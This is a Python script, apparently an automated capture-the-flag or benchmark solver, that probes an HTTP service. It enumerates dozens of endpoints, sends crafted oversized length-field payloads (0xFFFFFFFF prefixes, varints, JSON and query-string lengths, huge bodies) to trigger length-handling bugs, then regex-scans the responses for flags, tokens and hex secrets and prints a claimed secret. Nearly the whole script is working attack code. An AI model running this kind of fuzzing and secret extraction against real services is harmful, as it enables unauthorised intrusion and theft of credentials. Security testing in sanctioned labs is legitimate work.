import json, sys, base64, re, traceback

def req(method, path, body=None, body_hex=None, headers=None):
    m = {"http": {"method": method, "path": path}}
    if body is not None:
        m["http"]["body"] = body
    if body_hex is not None:
        m["http"]["body_hex"] = body_hex
    if headers:
        m["http"]["headers"] = headers
    try:
        sys.stdout.write(json.dumps(m) + "\n")
        sys.stdout.flush()
    except Exception:
        return None
    try:
        line = sys.stdin.readline()
    except Exception:
        return None
    if not line:
        return None
    try:
        return json.loads(line)
    except Exception:
        return None

def b64d(s):
    try:
        return base64.b64decode(s or "", validate=False)
    except Exception:
        return b""

found = []
seen = set()

def record(desc, r):
    if not r:
        return
    raw = b64d(r.get("body_b64"))
    txt = raw.decode("latin-1")
    key = (desc.split()[0], r.get("status"), len(raw))
    print("RESP", desc, r.get("status"), r.get("content_type"), repr(txt[:400]))
    found.append((desc, r.get("status"), txt, raw))
    seen.add(key)

paths = ["/", "/parse", "/record", "/records", "/api/parse", "/api/record", "/api/records",
         "/v1/parse", "/read", "/ingest", "/upload", "/data", "/echo", "/debug", "/info",
         "/version", "/routes", "/api", "/status", "/health", "/help", "/docs", "/index.html",
         "/robots.txt", "/favicon.ico", "/decode", "/stream", "/feed", "/msg", "/message",
         "/frame", "/frames", "/packet", "/packets", "/import", "/submit", "/process",
         "/handle", "/req", "/request", "/rec", "/r", "/p", "/record/parse", "/parse/record",
         "/binary", "/raw", "/blob", "/len", "/length", "/v1/records", "/v2/parse"]

print("=== PHASE1 ===")
cands = []
for p in paths:
    r = req("GET", p)
    if r:
        raw = b64d(r.get("body_b64"))
        record("GET " + p, r)
        if r.get("status") != 404:
            cands.append(p)
for p in paths:
    r = req("POST", p, body="")
    if r:
        raw = b64d(r.get("body_b64"))
        record("POST " + p, r)
        if r.get("status") not in (404, 405):
            cands.append(p)

for p in ["/", "/parse", "/record", "/records", "/api/parse", "/ingest", "/data", "/upload", "/msg"]:
    if p not in cands:
        cands.append(p)

def payloads():
    out = []
    A = b"A"
    for n in (0xFFFFFFFF, 0x7FFFFFFF, 0xFFFFFFF0, 0x10000000, 0x01000000, 0x00100000, 0x00010000,
              0x0000FFFF, 0x00001000, 999999999, 65536, 4294967295):
        try:
            out.append(("rec4_%x" % n, n.to_bytes(4, "big") + b"B" * 64))
            out.append(("rec4l_%x" % n, n.to_bytes(4, "little") + b"B" * 64))
            out.append(("rec2_%x" % (n & 0xFFFF), (n & 0xFFFF).to_bytes(2, "big") + b"B" * 64))
        except Exception:
            pass
    # varint-ish
    out.append(("varint_big", b"\xff\xff\xff\xff\x0f" + b"B" * 32))
    out.append(("tlv_big", b"\x01\xff\xff\xff\xff" + b"C" * 32))
    out.append(("len_ascii", b"4294967295\n" + b"D" * 32))
    out.append(("len_ascii2", b"LENGTH=4294967295\n" + b"D" * 32))
    out.append(("len_ascii3", b"length: 4294967295\n" + b"D" * 32))
    out.append(("len_json", json.dumps({"length": 4294967295}).encode()))
    out.append(("len_json2", json.dumps({"len": 4294967295, "data": "A" * 32}).encode()))
    out.append(("len_json3", json.dumps({"size": 4294967295}).encode()))
    out.append(("len_json4", json.dumps({"count": 4294967295}).encode()))
    out.append(("len_json5", json.dumps({"n": 4294967295, "records": 4294967295}).encode()))
    out.append(("huge_a", b"A" * 65536))
    out.append(("huge_b", b"B" * 262144))
    out.append(("huge_c", b"A" * 4096))
    out.append(("rec4_plus", (1000000).to_bytes(4, "big") + b"E" * 32))
    return out

OCTET = {"Content-Type": "application/octet-stream"}
JSONH = {"Content-Type": "application/json"}
TXT = {"Content-Type": "text/plain"}

print("=== PHASE2 ===")
for p in cands:
    for name, raw in payloads():
        h = OCTET
        if name.startswith("len_json"):
            h = JSONH
        elif name.startswith("len_ascii") or name.startswith("huge"):
            h = OCTET
        r = req("POST", p, body_hex=raw.hex(), headers=h)
        if r:
            record("POST %s %s" % (p, name), r)

print("=== PHASE3 ===")
qs = ["len=4294967295", "length=4294967295", "size=4294967295", "n=4294967295",
      "count=4294967295", "records=4294967295", "num=4294967295", "chunk=4294967295",
      "length=65536", "len=65536"]
for p in cands[:14]:
    for q in qs:
        r = req("GET", p + "?" + q)
        if r:
            record("GET %s?%s" % (p, q), r)

print("=== SCAN ===")
hexre = re.compile(r"(?<![0-9a-fA-F])([0-9a-fA-F]{24,128})(?![0-9a-fA-F])")
secre = re.compile(r"(?i)(secret|token|flag|key)[^0-9a-zA-Z]{0,12}([0-9a-zA-Z_\-]{8,128})")
brace = re.compile(r"(?i)(?:flag|secret)\{([^}]{4,128})\}")
cands_secret = []
for desc, st, txt, raw in found:
    if st in (404, 405):
        continue
    low = txt.lower()
    interesting = ("secret" in low) or ("flag" in low) or ("token" in low) or ("overflow" in low)
    for m in brace.finditer(txt):
        cands_secret.append((desc, "brace", m.group(1)))
    for m in secre.finditer(txt):
        cands_secret.append((desc, "kv", m.group(2)))
    for m in hexre.finditer(txt):
        c = m.group(1)
        if interesting or len(c) >= 32:
            cands_secret.append((desc, "hex", c))

for c in cands_secret:
    print("CAND", c[0], c[1], repr(c[2])[:200])

def norm(tok):
    t = tok.strip()
    if re.fullmatch(r"[0-9a-fA-F]+", t) and len(t) % 2 == 0 and len(t) >= 16:
        return t.lower()
    try:
        return t.encode("utf-8").hex()
    except Exception:
        return None

best = None
for desc, kind, tok in cands_secret:
    h = norm(tok)
    if h and re.fullmatch(r"[0-9a-f]{16,256}", h):
        best = (desc, kind, h)
        break

if best:
    print("BEST", best)
    print('CLAIM:{"secret_hex": "%s"}' % best[2])
else:
    print("NOSECRET")